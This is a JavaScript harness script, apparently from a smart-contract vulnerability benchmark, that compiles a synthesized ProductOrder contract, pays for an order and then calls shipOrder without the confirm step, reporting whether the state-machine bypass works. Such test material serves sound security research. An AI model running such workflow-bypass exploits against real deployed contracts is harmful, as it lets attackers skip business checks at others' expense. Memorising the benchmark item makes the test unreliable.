require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');


const { createLoggerWeb3 } = require('@lib/web3/deploy');

const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-9.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
async function exploit(web3, envInfo, contractAddress) {
    try {
        // Load the contract
        let { abi } = await compileWithVersion(source, 'ProductOrder', 'ProductOrder', extractSolcVersion(source));
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        // Pay for the order to reach the Paid status
        console.log("Paying for the order to reach the Paid status...");
        let paymentAmount = await contractInstance.methods.price().call();
        await contractInstance.methods.payForOrder().send({
            from: web3.eth.accounts.wallet[0].address,
            value: paymentAmount,
            gas: 3000000
        });

        // Attempt to ship the order without confirming it
        console.log("Attempting to ship the order without confirming it...");
        let step2Receipt = await contractInstance.methods.shipOrder().send({
            from: web3.eth.accounts.wallet[0].address,
            gas: 3000000
        });

        if (step2Receipt.status) {
            console.log("Exploit successful: Order shipped without confirmation!");
            return true;
        } else {
            console.log("Exploit failed: Order shipping unsuccessful.");
            return false;
        }
    } catch (error) {
        console.error("Error during exploitation:", error);
        return false;
    }
}



module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
